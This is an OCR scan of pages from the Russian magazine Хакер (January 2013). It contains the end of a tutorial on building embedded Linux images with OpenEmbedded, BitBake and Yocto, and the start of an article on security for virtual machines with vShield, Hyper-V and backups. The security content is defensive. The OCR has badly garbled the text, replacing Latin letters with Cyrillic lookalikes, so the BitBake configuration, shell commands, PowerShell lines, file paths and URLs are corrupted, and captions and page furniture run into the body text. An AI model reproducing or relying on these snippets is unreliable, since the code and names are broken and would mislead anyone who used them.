переменных и инклуды. При запуске ВііВаке смотрит в текущем 
каталоге файл сопІ/ЬЫауегз.сопІ, в котором указано расположе- 
ние слоев. 

«Слой» — абстракция, позволяющая гибко конфигурировать 
итоговый образ. Допустим, тебе надо кастомизировать образ 
под определенную машину. Ты делаешь это, не затрагивая 6Ш. 

И наоборот — если надо что-то сделать с интерфейсом, то ни- 
жележащий слой ты не трогаешь. В слоях имеются также файлы 
*.ЬЬаррепЬ. Допустим, тебе надо применить патч к какому-либо 
пакету. Чтобы следовать принципу Оккама, ты не копируешь файл 
*.ЬЬ из этого пакета, а создаешь ЬЬаррепсІ-файл и в нем уже до- 
бавляешь то, что нужно. 

Давай попробуем создать свой слой на основе теіа-зкеіеіоп. 
Назовем его теіа-хакер. Чтобы это сделать, скопируй твоим 
любимым файловым менеджером каталог теіа-зкеіеіоп в теіа- 
хакер и добавь соответствующую строку в файл Ьиіісі/сопі/ 
ЬЫауег5.соп1. 

Внутри теіа-хакер удали все гесірез-* и создай подкаталог 
гесірез-соге со следующими каталогами: 

# Ьазе-раззѵѵЬ/Ьазе-раззѵѵсі-З.б^б — тутибудутизменения; 

# Ьазе-Іііеэ — итуттоже небольшое; 

# тадез — конфигурация образа. 

Первым делом нам надо поправить файл теіа-хакер/сопі/іауег. 
сопі. После редактирования он должен выглядеть следующим 
образом: 

теіа-хакер/соп-Р/Іауег.соп* 

# К переменной ВВРАТН добавляется каталог текущего слоя. 

# Оператор присвоения означает «добавить к строке 

# без пробела» 

ВВРАТН .= ":${І.АѴЕКОІК}" 

# Добавляем файлы *.ЬЬ и *. ЬЬаррепсі слоя. 

# - присвоение с заменой 

ВВРИЕ5 := "${ВВРИЕ5> ${ІАѴЕК0ІК}/гесірез-*/*/* . ЬЬ «-* 
${І.АѴЕКОІК}/ гесірез -*/*/*• ЬЬаррепсі" 

# Грубо говоря, добавляет название слоя к соответствующей 

# переменной. Оператор присвоения "+=" - добавление 

# к строке с пробелом 
ВВРИ.Е_СОИЕСТІ(Ж5 += "хакер" 



«СЛОЙ» — АБСТРАКЦИЯ, 
ПОЗВОЛЯЮЩАЯ ГИБКО 
КОНФИГУРИРОВАТЬ 
ИТОГОВЫЙ ОБРАЗ 




ОрепЕтЬесМегі может запускаться на Иокіа N800... 

# Загадочная переменная, которой всегда присваивают 

# именно это, не менее загадочное значение 
ВВРИЕ_РАТТЕКМ_хакер := " л ${ ІАѴЕКОІК}" 

# Приоритет слоя (если слои содержат одинаковые пакеты) 

ВВРИЕ_РКІОКІТѴ_хакер = 6 

Далее создай ЬЬаррепЬ-файл для патча (сам патч ты найдешь 
на нашем диске): 

теіа-хакер/гесірез-соге/Ьазе-раззмсі/- 
Ьа5е-раззысІ_3 .5.26. ЬЬаррепсі 

# Расширяет область поиска файлов. Что такое ${ТНІ50ІК}, 

# понятно, а ${Р} - имя и версия пакета 
РИЕ5ЕХТКАРАТН5_ргерепсІ := "${ТНІ50ІК}/${Р>" 

# Полагаю, тут почти ничего объяснять не надо. 

# Единственное, что можно добавить, - в качестве 

# источников могут использоваться СІТ, 5\М, НТТР и еще 

# до кучи всего. При этом, правда, необходимо указывать 

# чек-сумму (МОБ или 5НА-256) 

5КС_ІІКІ += "б1е://хакер-изег.ра1:с1Г 

Еще один ЬЬаррепсі: 

теіа-хакер/гесірез-соге/Ьазе-ЯІез/^ 

Ьазе-Я1ез_3 .0.14. ЬЬаррепсі 

# В принципе, то же самое можно сделать 

# в ЬиіІсі/соп-Р/ІосаІ.соп-Р 
Ьозіпате = "хакер-Ьоз!" 

Атеперь напишем ЬЬ-файл образа. 

теіа-хакер/гесірез-соге/ішаеез/ 

# Несмотря на то что мы не можем наследовать 

# от ЬЬ-файлов, мы можем их включать 

іпсіисіе гесірез -соге/іта^ез/соге-ітабе-тіпітаІ.ЬЬ 

# Поддерживаются также Ьгі-Рз, А вот с сгат-Рз 

и может возникнуть проблема - зависимость не определена. 

# Впрочем, есть вероятность, что к моменту выхода статьи 

# это исправят 

ІМАСЕ_Р5ТѴРЕ5 = Чаг.Ьгг ех1:3 ехі4" 

# В образ включены утилиты отладки, чтобы хоть немного 
соответствовать названию 

ІМАСЕ_Р Е АТІІКЕ5 += "аеЬив-ЮоХз" 



114 



ХАКЕР 01 /168/2013 




Что нам стоит Тукса встроить? 



Г* ОЕМЦ - + X 

I РІ8СОПП0СІ Орііопа СІірЬоаггі 5еп8 СІгІ-АК-ОеІ 



ЗглВШЗ (иегзіоп рге -0 .6 .3-20110315 112ИЗ Іііі) 

ІРХЕ с>1 .0.0-591 -д?лее315 

ІРХЕ (Ыір Ѵ/ірхе . огд ) 00:03.0 САОО РСІ2.10 РпР РИП*О?ЕС8СВО*О7Г88С0О САОО 
Вооі іпд Ггот ВОН. . . 

Оесопргекзіпд Ьішіх... Рагхіпд ЕЬГ... гіопе . 

Вооі іпд Ню кегпеі. 

Р1еа$е иаіі: Ьооііпд... 

хакер- Ішхі Іодіп: хакер 
Хакер0хакер-Ьо5і:“$ 



Запущенный образ в ОЕМІІ 




ОрепЕтЬесісІесІ может запускаться на Ка$рЬегту Рі 



Кросс-компиляция в ОрепЕтЬесісІесІ происходит так: 

• В первую очередь загружаются исходники кросс-тулчейна (на- 
бора утилит для кросс-сборки, в который входят компилятор, 
ассемблер, линкер и отладчик). 

• С использованием уже установленного компилятора они со- 
бираются в исполняемые файлы — но не для целевой системы, 
а для хостовой. 

• С использованием кросс-компилятора на основе исходников 
кросс-компилируемой программы генерируется ассемблерный 
код (кстати, возможен также и промежуточный код). 

• Ассемблер переводит код в команды процессора. 

• Линкер компонуетполученный коде библиотеками. Этотэтап 

в некоторых случаях, таких, например, как компиляция ядра или 
библиотеки дІіЬс/исІіЬс, необязателен. 

Возможно, я опустил некоторые детали (работу препроцессора, 
например), но в целом кросс-сборка осуществляется вышеописан- 
ным образом. Для разработки приложений под ОрепЕтЬесісІесІ не- 
обходим АйТ (Арріісаііоп Оеѵеіортепі Тооікіі) — в ОрепЕтЬесісіесі- 
сіаззіс аналогичное средство называлось БйК. АйТ включает 
в себя следующие части: 

• кросс-тулчейн — что в него входит, я уже писал выше; 

• Бузгооі — базируется на образе целевой корневой ФС и содержит 
заголовочные файлы, библиотеки и некоторые конфиги; 

• ОЕМІІ — без комментариев; 

• некоторыетулзы дляупрощения разработки, такие, например, 
как І_аІепсуТОР, ОРгоЛІе, РегЛ 

• имеетсятакже плагин для ЕсІірзеотѴосІоРгоіесІ. 

Рассмотрю последний чуть подробнее. Этот плагин упрощает 
разработку приложений для конечного использования и позволяет 
непосредственно из Есіірзе производить кросс-компиляцию, про- 
филировку и отладку. Также поддерживается набор инструментов 
для сбора данных о питании, задержках и производительности. 

Я здесь не буду рассматривать установку, лишь перечислю необхо- 
димые средства: 

• Есіірзе ІпЬідо 3.7.2 — собственно ЮЕ; 

• СйТ с поддержкой Диіоіооіз — тулкитдля С-разработчиков; 

• ИТпд — ЫпихТгасіпдТооІкіІ— тулкитдля трассировки; 

• ТМ апсі Р5Е — Тагдеі МападетепІапЬ РетоІеБузІет Ехріогег. 

В данном случае этот плагин необходим для удаленного управле- 
ния отлаживаемой системой. 

Что же до разработки приложений для встраиваемых систем, 
то тут есть пара нюансов, о которых хотелось бы упомянуть. 



Установи снова переменные окружения путем запуска ое-іпіі- 
ЬиіІсІ-епѵ — лишний раз никогда не помешает, запасись кофейком 
и вперед — до полной компиляции! Ах да, команда: 

$ Ьі-ЬЬаке хакер-іта§е 

Хочешь запустить скомпилированный образ в ОЕМІІ и не замо- 
рачиваться с N/N0? Набери следующее: 

$ гипцети цетихвб хакер-іта§е зегіаі 

Спустя какое-то время (у тебя предварительно запросят пароль 
зисіо для установки интерфейса (ар] он загрузится, и ты увидишь 
приглашение входа в систему. 



КРОСС-КОМПИЛЯЦИЯ и дот 



Кросс-компиляция — это компиляция из-под одной платформы (хо- 
стовой, Ьобі) для другой платформы (целевой, Іагдеі). Почему необхо- 
димо компилировать под одной платформой то, что будет запускаться 
на другой, надеюсь, очевидно — например, одним из сценариев может 
быть отсутствие ресурсов для компиляции на целевой платформе. 




ОрепЕтЬесісІесІ использовался при создании платы ЕгіепсІІуАНМ Міпі2440 



ХАКЕР 01 /168/2013 



115 






ІМІХОІО 




Базовый класс ВііВаке, от которого в конечном итоге наследуется все остальное 



статический алгоритм старается предупредить и это, переписы- 
вая старые данные в новые блоки; 

• возможностьхранения информации в сжатом виде. 

Не все файловые системы, которые я хочу описать, доступны 
в данный момент в ОрепЕтЬесМесі. Тем не менее представление 
о них иметь надо. 

• сгат^Б — ФСтолько для чтения. Проста и компактна. Поддержи- 
ваетгІіЬ-сжатие. 

• БциазЬРБ — основноеотличиеотсгатіз— этоалгоритм І.2МА. 

• ЗРР52 — да-да, ты правильно догадался, что первая буква озна- 
чает<Ооигпа1» — журналируемая. Поддерживаетсбор мусора 

и оптимизацию износа. 

• ѴАРР52 — используется в АпсігоісТ Посравнениюс ЗРР52, сбор- 
щик мусора, более простой и быстрый. Монтированиетакже 
происходитбыстрее. 

• ІШІР5 — сегодня для встраиваемыхсистем рекомендуется 
использоватьименноэтуФС, посколькув ней появилсяуро- 
веньабстракции— тома ІІВІ.Тома ІІВІ создаются только поверх 
«сырых»флеш-устройств — никакихБО/ММС или СР! Служатони 
примерно для тех же целей, чтоиІ_ѴМ. 



Во-первых, если ты разрабатываешь нечто низкоуровневое, 
то должен помнить о том, какая архитектура будет применяться 
в качестве целевой: Ьід-епсііап или ІіШе. Во-вторых, если исполь- 
зуешь не дІіЬс, а, например, исІіЬс, то в ней имеются следующие 
ограничения: 

• не поддерживаются базы данных (имеются в виду Вегкіеу ЭВ 
и производные); 

• N15 не поддерживается (этотанахронизм еще где-то используется?); 

• урезанная поддержка локалей. 



ФАЙЛОВЫЕ СИСТЕМЫ И ЗАГРУЗЧИК 



На этапе планирования ты должен выбрать, какую файловую 
систему будешь использовать. Вариантов здесь достаточно 
много, как, впрочем, и во всем остальном, что касается Ыпих- 
систем. Но прежде всего отвечу на незаданный вопрос — почему 
для встраиваемых систем не рекомендуется использовать на- 
стольные ФС. 

Из-за особенностей флеш-памяти, в основном и применяе- 
мой при разработке встраиваемых систем, один бит информации 
допускается сбрасывать в нуль, в то время как для обратной 
операции — изменения с нуля на единицу — необходимо пере- 
вести в это состояние весь блок. Плюс к этому у флеш-памяти 
ограниченный срок службы, то есть блоки могут быть перезаписа- 
ны определенное число раз, а потом они «портятся». Кроме того, 
бывают такие ситуации, когда писать на устройство не требуется 
или невозможно. Из этого следует, что ФС должна быть спроекти- 
рована с учетом вышесказанного и иметь следующие функции: 

• сбор мусора— для подготовки использования засоренных бло- 
ков. При этом та часть блока, что еще не засорена, переносится 
на другой блок, а старый блок стирается и вновь становится при- 
годным для использования; 

• контроль дефектных блоков. Тут все более-менее ясно — не- 
которые блоки со временем становятся негодными для исполь- 
зования, и их физическое положение надо где-то записывать. 
Некоторыеустройства поддерживаютэтонааппаратномуровне, 
но для некоторыхзадачудолжнареализовыватьФС; 

• оптимизация износа. Из-заограниченногосрока службы флеш- 
памяти приходится придумыватьалгоритмы дляуменьшения 
ее износа. Имеются два видаалгоритмовуменьшения износа — 
динамический, который пытается распределить информацию 
по блокам равномерно, а не писать в один и тотже блок по многу 
раз, и статический — некоторыетипы флеш-памяти имеютеще 
и ограничение на время чтения междудвумя записями; если 

в блок слишком долго не писать, данные могут пропасть. Так вот, 



После создания образа его надо как-то грузить. В отличие 
от настольных систем, во встраиваемых системах зачастую нет 
ВІ05, поэтому надо либо писать ІРІ_ самому, либо использовать уже 
готовый ІРІ_, который, возможно, все равно придется дорабатывать 
ручками. В качестве последнего часто используется ІІ-ВооІ, на- 
званный в честь одноименной подводной лодки. Конфигурация его 
происходит через изменение Ь-файлов, то есть в рантайме ничего 
изменять нельзя. После компиляции установить его можно, либо 
обновив уже существующий У-Вооі, либо прошив через ЛА6. 



ИТОГИ 



В статье я рассмотрел фреймворк для сборки ОрепЕтЬесісІесІ. 
Конечно, не полностью — чтобы подробно его описать, пришлось 
бы наваять целую книгу. Но я и не ставил перед собой такую 
задачу. Также, несмотря на то что мы рассматривали только 
ОрепЕтЬесМес), статья дает представление о том, как происходит 
сборка встраиваемых систем вообще — собираешь ли ты с исполь- 
зованием Виіісігооі либо же используешь ОрепВгіскз. □□ 



ПЛАТФОРМА ѴОСТО 




* На диске ты 
найдешь архив 
с примером слоя. 



Ѵосіо предоставляет набор компонентов (ин- 
струментарий разработчика, система сборки 
Року, набор программных интерфейсов, кол- 
лекция метапакетов) для создания собствен- 
ных дистрибутивов для встраиваемых продук- 
тов на базе различных аппаратных архитектур, 
в том числе АРМ, РРС, МІР5, х86 и х86-64. Пока 
статья готовилась к выпуску, вышел Ѵосіо 1.3. 
Из новинок и усовершенствований: 

• Ѵосіо аиІоЬиіІгіег — набор утилит для авто- 
матизированного тестирования и оценки 
качества продукта; 

• исключен один из этапов сборки кросс- 
тулчейна; 

• появился скрипт для отслеживания време- 
ни сборки компонентов дистрибутива; 

• в загрузчике 6гиЬ включена поддержка 
ІІЕРІ; 

• плагин для Есіірзе обновлен до версии Зипо. 




• уосіоргоі есі. 

— информация 
о встраиваемом 
Ыпих, в том числе 
и документация, 
относящаяся к Ореп- 
ЕтЬесМегі. 



116 



ХАКЕР 01 /168/2013 






ЦЕНТРАЛИЗОВАННОЕ 
ОБЕСПЕЧЕНИЕ 
БЕЗОПАСНОСТИ 
ГОСТЕВЫХ СИСТЕМ 

Многие специалисты считают, что виртуализа- 
ция и облачные технологии скоро станут осно- 
вой ІТ-инфраструктуры их компаний. Аналитики 
подтверждают это, прогнозируя, что каждый 
седьмой доллар в 2015 году будет потрачен 
на виртуализацию. Однако есть и сдерживаю- 
щие факторы, главный из которых — вопрос, 
как обеспечить безопасность. 



ПРОБЛЕМЫ ЗАЩИТЫ ВИРТУАЛЬНЫХ СИСТЕМ 



Создать привычный барьер из файрвола, Ю5/ІР5 и антивируса 
в виртуализированной среде не всегда возможно, поскольку мно- 
гие традиционные средства защиты ориентированы на контроль 
трафика с физических хостов, а данные, которыми обмениваются 
ѴМ, остаются для них «невидимыми». Кроме того, сами ѴМ нередко 
«переезжают» на другой хост или ЦОД. Конечно, можно устано- 
вить полный защитный комплект на каждую ѴМ, но это на порядок 
усложнит сопровождение и стоимость ПО, не говоря уже о том, 
что данные в таком случае будут дублироваться. Несколько ѴМ, 
запущенных на одном физическом сервере, имеют доступ к одним 
и тем же физическим ресурсам, что порождает новые риски. Вре- 
доносы могут заражать файлы, используемые другими ѴМ, и таким 
образом проникать в эти системы или перехватывать трафик 
между виртуальными машинами. Появились и специфические ата- 
ки. Так, ошибка в ВІОБ'е материнской платы Іпіеі 0035.10 позволи- 
ла обойти защиту памяти гипервизора Хеп. Стоит также вспомнить 
громкий инцидент, который произошел в 2009 году, когда, исполь- 
зуя уязвимость в гипервизоре НурегѴМ, хакеры уничтожили более 
100 000 сайтов хостера І_ХІ_аЬз. 

По сравнению с традиционными сетями, в виртуализированной 
среде проблемы обеспечения безопасности систем имеют другие 



118 



ХАКЕР 01 /168/2013 







Спасти матрешек 




Настройка задачи в консоли Каврегвку Бесигііу Сепіег 



корни, должны решаться иначе и при помощи других инструмен- 
тов. Учитывая разнообразие гипервизоров и слабую изученность 
проблемы, универсального решения никто не предлагает, каждый 
вендор рекомендует свой вариант защиты, позиционируя его 
как наиболее правильный. В настоящее время основные разра- 
ботки ведутся по нескольким направлениям: обеспечение защиты 
ЦОД, сетевых подключений и устройств, работающих с сіоисі- 
сервисами, а также подготовка стандартов и рекомендаций. 



ЗАЩИТА СЕТЕВЫХ ПОДКЛЮЧЕНИЙ 



Часто один хост содержит несколько однотипных ѴМ, поэтому, 
взломав одну из них, хакер с легкостью получит доступ и к осталь- 
ным. Традиционные системы защиты, вроде брандмауэра и сете- 
вой Ю5/ІР5, отслеживают трафик между физическими серверами, 
что порождает так называемый Соттипісаііоп ВІіпсІ Броіз, когда 
админ ничего не знает об обмене данными между приложениями 
и ѴМ. Активация файрвола на каждом виртуальном узле может 
повлечь за собой серьезную головную боль у админа, поскольку 
существенно возрастет количество настроек (задача осложняется 
еще и тем, что ѴМ могут активно взаимодействовать между собой, 
кроме того, со временем они могут быть перенесены на другой 
сервер). Разработчики систем виртуализации предлагают свой 
вариант — виртуальные коммутаторы и брандмауэры, предостав- 
ляемые гипервизором, которые позволяют изолировать и контро- 
лировать трафик разных клиентов. 

Одна из первых технологий защиты гостевых ОС, появив- 
шаяся в продуктах промышленного класса, носит название 
ѴМѵѵаге ѵБЬіеІсІ и состоит из нескольких компонентов. Например, 
компонент ѵБЬіеІсІ 2опев реализует функции файрвола, среди 
задач которого контролировать входящий и исходящий тра- 
фик в среде ѴМѵѵаге ѵСепІег (включая трафик между машинами 
в одной группе) и обеспечивать базовую защиту от сетевых угроз. 
Решение построено на основе Ѵігіиаі БЫеМ, который перешел 
к ѴМѵѵаге вместе с приобретенной в 2008 году компанией ВІие 
Сапе ТесЬпоІодіез (известна тем, что занималась разработкой 
систем безопасности для виртуальных сред). Представляет со- 
бой промежуточный слой между гипервизором ЕБХі и гостевыми 
ОС, реализованный в виде адаптеров ѵІЧІС на хосте ЕБХі. Такой 
подход позволяет обеспечивать контроль всего трафика, без не- 
обходимости в установке агентов на ѴМ или ОС. Администратор 
может создавать политики, контролирующие ІР/порт источни- 
ка и назначения, протокол. В настоящее время ѵБЬіеІсІ 2опез 
является частью более мощного решения ѵБЫІегі Арр, способного 
создавать правила на уровне приложений (Арріісаііоп 1_ауег 
Оаіеѵѵау) для большого числа протоколов, наблюдать за сетевой 
активностью ѴМ, защищать перемещаемые с помощью техно- 




Диспетчер авторизации позволяет назначить права управления доступом к 
приложению на основе ролей 

логии ѵМоііоп виртуальные машины, строить отчеты, управлять 
политиками и многое другое. 

ѵБЬіеІсІ Есіде является более «глобальным» продуктом, он обе- 
спечивает комплексную защиту периметра дата-центра и имеет 
возможность изоляции трафика в его пределах на уровне групп 
портов. Сочетает в себе КгеѵѵаІІ, ѴРК ОНСР, МАТ, І_оасі Ваіапсіпд, 
сбор статистики и некоторые другие функции. 

Компоненты ѴМѵѵаге ѵБЬіеІсІ легко разворачиваются и под- 
держиваются всеми версиями ѴМѵѵаге ѵБрЬеге. Централизован- 
ное управление обеспечивается при помощи консоли ѵБЬіеІсІ 
Мападег, которая реализована в виде ОѴА-образа (ѴМѵѵаге ѵСІоиб 
Меіѵѵогкіпд апсі Бесигііу). После импорта и загрузки ѴМ следует 
зарегистрироваться из локальной консоли (логин «асітіп», пароль 
«сМаиіЫ и настроить сеть, выполнив две команды: 

тапа^ег# епаЫе 
тапа§ег# зеТир 

Далее вводим по запросу ІР, сетевую маску, адрес шлюза 
и ОМБ-сервера, после чего подключаемся при помощи браузера 
по ІР, настраиваем соединение с ѵСепІег Бегѵег и затем правила. 

В реализации сетевой подсистемы Нурег-Ѵ 3.0 также появи- 
лись соответствующие компоненты. Так, виртуальный коммутатор 
Нурег-Ѵ ЕхІепзіЫе БѵѵіІсЬ ( аоо.дІ/зѲиІ 2 ) обеспечивает применение 
политик в области безопасности ѴМ, защиту от некоторых атак 
(спуфинг МАС-адреса, блокировка неавторизованного йНСР и так 
далее), изоляцию и приоритизацию трафика, метрики и поиск не- 
исправностей. Можно создавать виртуальный свитч одного из трех 
типов: Ехіегпаі, Іпіегпаі и Ргіѵаіе. 

Кроме консоли Нурег-Ѵ Мападег, предложены инструменты 
управления на базе ѴѴМІ и РоѵѵегБЬеІІ. Найти все командлеты мож- 
но, выполнив запрос: 

Р5> Се*-Не1р *ѴМ№*іѵогкАсІарТег* 

По умолчанию все соединения разрешены, командлет Асісі- 
ѴМИеІѵѵогкАсіарІегАсІ позволяет задавать списки доступа. Напри- 
мер, можно блокировать определенную сеть для сервера 5РѴ01: 

Р5> АсІсІ-ѴММеІіѴу/огкАсІарТегАсІ -ѴММате бгѵ01 ^ 
-КетоТеІРАсІсІгеББ 192.168.1.0/24 «-> 

-ЭігесТіоп ВоТЬ -АсТіоп Эепу 

Открытая архитектура Нурег-Ѵ, поддерживающая расширения, 
дает возможность сторонним разработчикам создавать средства 
контроля трафика и переадресации, фильтры брандмауэра. 



ХАКЕР 01 /168/2013 



119 




5ѴИ/АСК 




АНТИВИРУСНАЯ ЗАЩИТА 



Как и прежде, одним из главных элементов защиты является анти- 
вирус, но в случае использования ѴМ есть свои особенности. Так, 
установка антивирусного агента и сигнатурных баз на каждую ѴМ 
может привести к повышенному использованию ресурсов (так на- 
зываемый гевоигсе сопіепііоп), тем самым снижая производитель- 
ность отдельной ѴМ и всего хоста. 

Например, агенты на нескольких системах могут одновременно 
инициировать проверку или обновление баз, сигнатурные базы 
начнут дублироваться, проверке станут подвергаться одни и те же 
файлы. Далее усложняется сопровождение, так как требуется от- 
слеживать состояние и управлять работой всех агентов. Кроме того, 
решения, предлагаемые большинством вендоров, зачастую имеют 
избыточную функциональность, поскольку включают файрвол, веб- 
защиту, контроль приложений, антиспам и тому подобное. Для ѴМ 
в большинстве ситуаций необходим просто антивирус. С точки 
зрения производительности наиболее целесообразным решени- 
ем является интеграция системы безопасности с гипервизором 
и централизованное управление работой антивирусного продукта. 
Это позволит избежать излишней нагрузки и дублирования данных, 
полностью контролировать файловый и сетевой обмен в виртуали- 
зированной среде. 

ѴМѵѵаге предлагает разработку ѵБЬіеІсІ Епгіроіпі, позволяющую 
интегрировать антивирусное решение третьих фирм, которое, 
работая на уровне гипервизора, будет обеспечивать защиту 
ОС без использования агентов и минимально нагружать сервер. 
Для доступа к ѴМ используется специальный драйвер ѴМѵѵаге 
ѵБНіеІс! Епгіроіпі ТЫп Адепі (входит в комплект ѴМѵѵаге Тооіз). 

О поддержке ѵБЬіеИ ЕпгіроіЫ заявили практически все разработ- 
чики антивирусного ПО. 

Например, Ка5регзку Бесигііу для виртуальных сред (казрегвкѵ. 
ги/БесигіІу-ѵігІиаІігаІіоп ) поддерживает технологию ѵБЬіеІсі 
Епсіроіпі и не требует установки антивирусного агента на каждую 
ѴМ (хотя при необходимости может быть использован и агент). Ре- 
шение создано на базе 51І5Е І_іпих Епіегргізе Бегѵег и реализовано 
в виде ОѴА-образа. Все размещенные на хост-сервере виртуаль- 
ные машины, работающие под управлением ѴѴіпсІоѵѵз, для анти- 
вирусной проверки используют одно виртуальное устройство, с ко- 
торым соединены посредством драйвера. Поддерживается любая 
иерархия: отдельный хост Е5ХІ, ѴМѵѵаге ѵСепІег Бегѵег, кластер 
ѴМѵѵаге, ресурсный пул и так далее. Общее управление системой 
защиты физических и виртуальных систем, а также мобильных 
устройств производится из единой консоли администрирования 
Каврегзку Бесигііу Сепіег. Профили защиты позволяют гибко на- 
строить параметры для разных виртуальных машин. 

Комплексная система защиты физических и виртуальных сред 
Тгепгі Місго Реер Бесигііу работает как с установкой агентов, так 




Создание снапшота ѴМ в консоли ѵЗрЬеге СІіепІ 



и без них и позволяет реализовывать гибкие политики. Специ- 
ализированный «Антивирус и виртуальный файрвол для Нурег-Ѵ» 
( бпіпе.сот ) предоставляет возможность контролировать, блоки- 
ровать сетевой трафик между ѴМ и управлять им, обнаруживать 
атаки, сканировать системы, а также производить аудит, монито- 
ринг и прочие мероприятия для усиления безопасности. 

Использование гипервизора, управляющего состоянием ѴМ, 
позволит избежать еще одной проблемы — Іпзіапі-Оп. Дело в том, 
что спящие ОС и шаблоны, из которых создаются новые виртуаль- 
ные машины, спустя некоторое время не будут соответствовать 
текущим настройкам безопасности, в связи с устаревшими вер- 
сиями баз и отсутствием последних заплаток. Период обновления 
до актуального состояния может занимать какое-то время, в те- 
чение которого подобные системы подвержены риску заражения. 
При этом имеющиеся системы обновлений, вроде ѴѴ51І5, умеют 
работать только с запущенными машинами. Вот при защите про- 
снувшихся/новых ОС и выручает интеграция антивируса, обладаю- 
щего самыми последними базами, с гипервизором. Также для оф- 
лайн-обновления остановленных и спящих ѴМ и шаблонов можно 
задействовать специальные решения. Например, для Нурег-Ѵ 
можно использовать МісгозоК ОНІіпе Ѵігіиаі МасЫпе Бегѵісіпд 
ТооІ, Бузіет Сепіег Ѵігіиаі МасЫпе Мападег 2012 и ѴМѵѵаге ИрсЫе 
Мападег. Кроме того, хорошо себя зарекомендовали механизмы, 
работающие по принципу «виртуального патча», — ѴИиаІ РаІсЬіпд 
и ѴиІпегаЬіІіІу БЫеІЫпд, блокирующие уязвимость до выхода офи- 
циального патча, ее устраняющего. 



РАЗГРАНИЧЕНИЕ ДОСТУПА 



Отсутствие четких границ в виртуализированной среде обуслав- 
ливает необходимость полноценного разграничения прав доступа 
и аудита деятельности администраторов/пользователей. В идеале 
администратор хостовой системы должен управлять работой толь- 
ко своего сервера и не иметь доступа к данным гостевых систем 
и тем более не иметь возможности удалить одним движением все 
ѴМ. Во многих решениях виртуализации уже реализована ролевая 
модель, позволяющая тонко настроить доступ. Например, ѴМѵѵаге 
ѵБрИеге предлагает достаточно эффективные инструменты адми- 
нистрирования, максимально стандартизирующие и автоматизиру- 
ющие основные операции (с целью снижения ошибок управления), 
средства аутентификации и ролевую модель доступа, позволяю- 
щую назначить необходимые права. 

Если этих возможностей не хватает, можно обратиться к специ- 
ализированному средству защиты виртуальной инфраструкту- 
ры, например ѵбаіе В2 (на данный момент поддерживает только 
ѴМѵѵаге ѵБрЬеге). Чтобы обеспечить безопасность данных, в этом 
решении реализованы две роли со своими функциями и возмож- 



но 



ХАКЕР 01 /168/2013 








Спасти матрешек 




Диспетчер Нурег-Ѵ позволяет быстро создать снимок 




Скрипт НурегѴ Васкир ТооІ используется для горячего 
бзкапа и восстановления ѴМ на базе Нурег-Ѵ 




• Описание 
виртуального 
коммутатора Нурег- 
V ЕхІепБІЫе БѵѵіІсЬ 

вМ5РМ: доо.дІ/ 

ійііП} 

• Казрегзку Бесигііу 
для виртуальных 
сред: к35рег§ку, 
иУ $ е сигі Іу-ѵИи а I - 
іг аііоп: 

• сайт Асгопів Васкир 
& Весоѵегу: асгопів. 
ги /баскир-гесоѵегу ; 

• процесс 

регистрации модуля 
записи Ѵ55Місго$оМ 
Нурег-Ѵ в системе 
архивации данных: 

5иррог1.тісго5оК. 

со т /кЬ/958662. 



ностями: администратор виртуальной инфраструктуры и админи- 
стратор информационной безопасности, ѵбаіе Р2 имеет сертифи- 
кат ФСТЭК, позволяющий применять этот продукт в защищенных 
системах. Реализована усиленная аутентификация администра- 
торов, автоматическая конфигурация безопасности, проверка 
целостности настроек, мандатная модель управления доступом 
(при которой каждый будет управлять строго своими ѴМ), правила 
разграничения доступа на основе АСЬ и портов, защита средств 
управления, контроль целостности ѴМ и расширенный аудит со- 
бытий и мониторинг. 

Стоит отметить, что в ОС ѴѴіпсІоѵѵз, начиная с версии 2003, 
реализован диспетчер авторизации (агтап.тзс), позволяющий 
назначить гибкие права управления доступом к приложению 
на основе ролей. Политики авторизации, применяемые во время 
выполнения, можно хранить в Ай, ХМЬ-файле и 5СІІ_-базе. Чтобы 
упростить первоначальную настройку, предложен готовый ХМ1_- 
файл (после установки роли лежит в С:\Ргодгат0аІа\Місго5ОІІ\ 
ѴѴіпсІоѵѵ5\Нурег-Ѵ\ІпіІіаІ5іоге.хтІ), который нужно просто подклю- 
чить в диспетчере. 



БЭКАП ѴМ 



Чтобы обеспечить доступность, очень важно создавать резервные 
копии. Использование виртуальных машин накладывает свои 
особенности, ведь чаще всего владельца интересует именно ѴМ 
целиком, а не данные приложения, с которыми он работает (они 
резервируются традиционным способом, здесь никаких особен- 
ностей нет). 

Наиболее простым решением является создание снимков. 
«Правильный» снимок работающей ѴМ содержит информа- 
цию в том числе из ОЗУ, поэтому в некоторых решениях такие 
снимки называют сЬескроіпГами, чтобы не путать с дисковыми 
зпарзЬоІ'ами. Необходимые функции предоставляет большинство 
средств управления гипервизором, позволяя создать снимок 
без остановки ОС. Например, чтобы создать сЬескроіпІ в Сіігіх 
ХепБегѵег, достаточно ввести «хе ѵт-сЬескроіпІ». Программы 
управления, вроде ѵБрЬеге СІіепІ или Нурег-Ѵ, позволяют создать 
снимок одним нажатием мышки. Кроме того, для бзкапа в ѴѴіпсІоѵѵз 
можно использовать систему архивации. Для этого необходимо 
лишь зарегистрировать модуль записи Ѵ55 МісгозоН Нурег-Ѵ в си- 
стеме архивации данных. Весь процесс подробно описан в руко- 
водстве КВ958662 ( 5иррог1.тісго5оН.сот/кЬ/958662 ). 

Правда, снимок больше подходит все-таки для краткосроч- 
ных задач (например, перед накатом критических обновлений), 
позволяя в случае проблем быстро вернуть ѴМ в работу. В зависи- 
мости от технологии резервирования размер такого бзкапа может 
занимать объем, сопоставимый с размером самой ѴМ, что требует 



дополнительного дискового пространства. А потому желательно 
применять дедупликацию или сжатие. Но главное, что снапшот 
по умолчанию создается на том же сервере, что и ѴМ, а значит, 
может быть также поврежден или недоступен. Поэтому для кри- 
тически важных ѴМ их снимки желательно сохранять на внешний 
ресурс. 

Применять для сопровождения одного или двух серверов такие 
средства управления, как Бузіет Сепіег Ѵігіиаі МасЫпе Мападег 
или ѴМѵѵаге ѵБрЬеге, нецелесообразно, поэтому пользователи 
ищут более простые инструменты. Тщательно пошерстив интернет, 
можно подобрать себе наиболее подходящий вариант. Например, 
для ѴМѵѵаге ЕБХі 3.5/4. х/5. х энтузиастами из комьюнити ѴМѵѵаге 
предложен РегІ-скрипт дЬеІІоѴСВ ( соттипіііез.ѵтѵѵаге.сот/сіосз/ 
РОС-8760 ). Его установка очень проста, достаточно распаковать ар- 
хив и настроить автозапуск через сгоп и в дЬеІІоѴСВ.сопІ параме- 
тры резервирования (все они хорошо расписаны). Поддерживается 
экспорт на ресурс ИРБ и отправка е-таіі об операции. 

Еще один простой в использовании скрипт— НурегѴ Васкир 
